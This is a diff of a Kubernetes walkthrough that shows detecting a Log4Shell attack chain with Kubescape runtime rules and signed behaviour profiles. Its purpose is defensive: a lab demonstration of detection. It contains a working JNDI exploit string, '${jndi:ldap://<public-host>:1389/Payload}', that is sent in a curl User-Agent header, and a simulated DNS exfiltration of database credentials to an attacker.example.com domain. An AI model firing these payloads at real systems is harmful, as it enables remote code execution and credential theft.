@@ -16,69 +16,34 @@ applied straight from GitHub; you only need to read the few lines that matter.
 
 ## 1. Install Kubescape with runtime detection on
 
+The `sbob-rc3` chart ships as a **GitHub release asset** (there is no Helm repo yet):
+
 ```bash
-helm repo add k8sstormcenter https://k8sstormcenter.github.io/helm-charts
-helm repo update
-helm install kubescape k8sstormcenter/kubescape-operator \
-  --version 1.40.3-sbob-rc3.1 \
+CHART=https://github.com/k8sstormcenter/helm-charts/releases/download/kubescape-operator-1.40.3-sbob-rc3.1/kubescape-operator-1.40.3-sbob-rc3.1.tgz
+helm install kubescape "$CHART" \
   -n kubescape --create-namespace \
   --set capabilities.runtimeObservability=enable \
   --set capabilities.runtimeDetection=enable \
   --set alertCRD.installDefault=true
 ```
 
-The **network** rules (DNS/egress) only fire if network detection is **enabled and configured
-correctly**. Two parts: the network rules must be *on*, and the alerts must reach an *exporter you
-can read*. Enable R0011 (it ships **off**) in the installed rules:
-
-```bash
-kubectl -n kubescape patch rules.kubescape.io default-rules --type=json \
-  -p "$(kubectl -n kubescape get rules.kubescape.io default-rules -o json \
-        | jq -c '[.spec.rules | to_entries[] | select(.value.id=="R0011")
-                 | {op:"replace", path:"/spec/rules/\(.key)/enabled", value:true}]')"
-```
-
-Then confirm your config matches — network tracing on, R0011 enabled, and at least one exporter set:
-
-```bash
-kubectl -n kubescape get cm node-agent -o yaml \
-  | grep -iE 'networkServiceEnabled|stdoutExporter|ExporterUrl|syslog|httpExporter'
-kubectl -n kubescape get rules.kubescape.io default-rules -o json \
-  | jq '.spec.rules[] | select(.id=="R0011") | {id, name, enabled}'
-```
-
-Node-agent writes alerts to **stdout** by default (`stdoutExporter: true` — read them with
-`kubectl logs`); it can also push to Alertmanager, syslog, or an HTTP endpoint
-(`nodeAgent.config.alertManagerExporterUrls` / `syslogExporterURL` / `httpExporterConfig`). Use
-whichever you have — just make sure one is configured.
+Node-agent writes alerts to **stdout** by default — read them with `kubectl logs`. (It can also push
+to Alertmanager, syslog, or HTTP, but that's not needed here.) This walkthrough covers **R0001** (RCE)
+and **R0005** (DNS exfil), which reproduce turnkey; the egress rule **R0011** needs an external
+attacker and is covered in [Also see R0011](#also-see-the-egress-rule-r0011) at the end.
 
 !!! info "Which build is this"
     `sbob-rc3` is the release candidate that ships the Bill of Behavior features (wildcards, signing,
     tamper detection) from `ghcr.io/k8sstormcenter/{storage,node-agent}`.
 
-## 2. Deploy the vulnerable app + the attacker
+## 2. Apply the Bill of Behavior — *before* the app
 
-One manifest brings up the whole chain (namespace `log4j-poc`) plus the in-cluster attacker
-(`attacker-ns`): a marshalsec LDAP server and a class-file HTTP server.
-
-```bash
-kubectl apply -f https://raw.githubusercontent.com/k8sstormcenter/bob/main/example/log4j-chain/log4j-chain.yaml
-kubectl -n attacker-ns rollout status deploy/attacker --timeout=60s
-```
-
-The only line that makes this exploitable is the backend's log4j version:
-
-```yaml
-# backend container, in log4j-chain.yaml
-image: ghcr.io/k8sstormcenter/chain-backend:vulnerable   # log4j 2.14.1 — JNDI lookups enabled
-```
-
-## 3. Give the backend its Bill of Behavior
-
-Apply the signed profiles that declare what each workload may do. These are supplied, not learned —
-so detection is live immediately, with no learning period:
+The profiles are **supplied, not learned**, so detection is live with no learning period. node-agent
+binds a user profile **when the pod starts**, so the profiles must exist first — create the namespace
+and apply them up front:
 
 ```bash
+kubectl create namespace log4j-poc
 BASE=https://raw.githubusercontent.com/k8sstormcenter/bob/main/_artifacts/log4j-sbobs
 for w in backend frontend observer postgres; do
   kubectl apply -f "$BASE/ap-chain-$w.yaml" -f "$BASE/nn-chain-$w.yaml"
@@ -123,7 +88,37 @@ egress:
 cannot hide by using them. What it *cannot* do without deviating is spawn a shell, run `getent`,
 resolve an unknown domain, or open an egress to the attacker. That is where it gets caught.
 
-## 4. Fire the exploit
+## 3. Make the attacker's exfil domain resolvable
+
+R0005 fires on a *resolved* DNS lookup, and the exfil target (`…exfil.attacker.example.com`) is a
+domain a real attacker would own. Simulate that in-cluster with a CoreDNS override, then reload
+CoreDNS so it takes effect:
+
+```bash
+kubectl apply -f https://raw.githubusercontent.com/k8sstormcenter/bob/main/example/log4j-chain/exfil-dns.yaml
+kubectl -n kube-system rollout restart deploy/coredns
+```
+
+## 4. Deploy the vulnerable app + the attacker
+
+One manifest brings up the whole chain (`log4j-poc`) plus the in-cluster attacker (`attacker-ns`): a
+marshalsec LDAP server and a class-file HTTP server. Its pods carry the
+`kubescape.io/user-defined-profile` labels that bind the profiles from step 2 **at pod start**:
+
+```bash
+kubectl apply -f https://raw.githubusercontent.com/k8sstormcenter/bob/main/example/log4j-chain/log4j-chain.yaml
+kubectl -n log4j-poc rollout status deploy/chain-backend --timeout=120s
+kubectl -n attacker-ns rollout status deploy/attacker --timeout=60s
+```
+
+The one line that makes this exploitable is the backend's log4j (pinned to a verified digest):
+
+```yaml
+# backend container, in log4j-chain.yaml
+image: ghcr.io/k8sstormcenter/log4j-chain-backend-vulnerable@sha256:8f3cb3f9…   # log4j 2.14.1 — JNDI enabled
+```
+
+## 5. Fire the exploit
 
 The attack pod sends the classic JNDI payload in a `User-Agent` header. Substitute the pod-name
 placeholder and apply it in one line:
@@ -149,7 +144,7 @@ args: [ curl, -s, -A,
     `${jndi:ldap://<public-host>:1389/Payload}`. The demo's attacker image takes the codebase host as
     an env var (`CODEBASE_HOST`), so it can run anywhere.
 
-## 5. See the detection
+## 6. See the detection
 
 First, recall what the profile **allows** — the two lists from the gif. Nothing here ever alerts:
 
@@ -215,44 +210,51 @@ database identity, smuggled out one DNS query at a time to a domain the profile 
 the classic DNS-exfiltration channel, caught because the *domain*, not just the connection, is
 outside the `NetworkNeighborhood`.
 
-#### R0011 — the Log4Shell call-out (two stages)
+Two rules, two facets of the same compromise — the RCE (**R0001**) and the credential theft it
+smuggles out over DNS (**R0005**) — reconstructed from kernel events and caught purely by deviation
+from the signed Bill of Behavior. You detected Log4Shell with **no CVE signature and no learning
+period** — purely because the backend did something its Bill of Behavior declares it never does.
 
-The vulnerable log4j reaches the attacker over TCP, to an address not in the egress allow-list, in
-the two stages that define the exploit:
+The third fingerprint — the outbound LDAP + HTTP call-out (**R0011**) — needs a couple of extra steps
+and is covered in [Also see: the egress rule (R0011)](#also-see-the-egress-rule-r0011) below.
+
+```bash
+kubectl delete ns log4j-poc attacker-ns      # clean up
+```
+
+## Also see: the egress rule (R0011) {#also-see-the-egress-rule-r0011}
+
+R0011 catches the outbound LDAP + HTTP that fetch the exploit class — the network fingerprint of
+Log4Shell. It's not in the turnkey path above for two reasons, both fixable:
+
+**1. R0011 ships disabled.** Enable it in the installed rules:
+
+```bash
+kubectl -n kubescape patch rules.kubescape.io default-rules --type=json \
+  -p "$(kubectl -n kubescape get rules.kubescape.io default-rules -o json \
+        | jq -c '[.spec.rules | to_entries[] | select(.value.id=="R0011")
+                 | {op:"replace", path:"/spec/rules/\(.key)/enabled", value:true}]')"
+```
+
+**2. R0011 skips private targets.** The in-cluster attacker is a ClusterIP (RFC-1918), so R0011 never
+fires against it. Run the attacker on an **external/public** host and point the JNDI there — the demo
+attacker image takes the codebase host as `CODEBASE_HOST`, so it runs anywhere:
+
+```yaml
+# in attack-pod.yaml, the User-Agent JNDI
+'${jndi:ldap://<public-host>:1389/Payload}'
+```
+
+With both in place, the two Log4Shell stages show up as out-of-profile egress — the LDAP referral and
+the `Payload.class` download:
 
 ```json
 {"RuleID":"R0011","alertName":"Unexpected Egress Network Traffic","ip":"<attacker>","port":1389,"proto":"TCP"}
 {"RuleID":"R0011","alertName":"Unexpected Egress Network Traffic","ip":"<attacker>","port":8888,"proto":"TCP"}
 ```
 
-Stage 1 (`:1389`) is the **LDAP referral** — the JNDI lookup that tells the victim *where* the payload
-lives. Stage 2 (`:8888`) is the **HTTP download** of `Payload.class`. Two outbound connections a web
-backend has no business making.
-
-!!! note "Why the ports may look odd"
-    R0011 needs a **non-private** target, so the attacker has to be external. In our capture it sits
-    behind a public tunnel that remaps the ports — the alerts show `19174`/`5516` instead of
-    `1389`/`8888`. A directly-reachable attacker would show the standard ports. And if the JNDI targets
-    an **IP** instead of a hostname, there's no LDAP DNS lookup — the call-out is pure TCP, carried by
-    R0011, not R0005.
-
-That is the whole compromise — RCE, credential theft, DNS exfiltration, and the C2 call-out —
-reconstructed from kernel events and caught purely by deviation from the signed Bill of Behavior.
-
-!!! warning "What gates the network rules (R0005 / R0011)"
-    - **R0011 is disabled by default** — enable it (see step 1) and verify with the `jq` check there.
-    - **Network detection must be enabled and its alerts readable** — network tracing on, and an
-      exporter you can read (stdout by default, or Alertmanager/syslog/HTTP). Don't assume
-      Alertmanager — check what your cluster has.
-    - **The attacker must be non-private** — R0011 skips RFC-1918/ClusterIP targets, so the LDAP
-      server has to be a real external/public host. An in-cluster attacker trips R0001 but never R0011.
-
-You detected Log4Shell with **no CVE signature and no learning period** — purely because the backend
-did something its signed Bill of Behavior declares it never does.
-
-```bash
-kubectl delete ns log4j-poc attacker-ns      # clean up
-```
+If the JNDI targets an **IP** rather than a hostname there's no LDAP DNS lookup — the call-out is pure
+TCP, carried by R0011 rather than R0005.
 
 ## Next
 
